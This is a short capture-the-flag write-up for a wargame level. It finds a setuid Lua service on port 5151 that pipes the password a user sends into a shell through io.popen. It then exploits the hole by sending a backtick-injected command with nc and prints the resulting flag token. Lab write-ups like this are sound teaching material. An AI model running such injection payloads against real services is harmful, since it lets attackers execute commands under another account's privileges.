# Level11
```bash
ls -la
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
```
```bash
./level11.lua
output:
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?
```

# address in use
```bash
netstat -tulpn | grep LISTEN
# ouput
(No info could be read for "-p": geteuid()=2011 but you should be root.)
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::4646                 :::*                    LISTEN      -
tcp6       0      0 :::4747                 :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::4242                 :::*                    LISTEN      -
```
we can connect to 127.0.0.1 on port 5151
read the file:
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

*io.popen can excute command*

nc 127.0.0.1 5151
Password: `getflag` > /tmp/flag
cat /tmp/falg
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
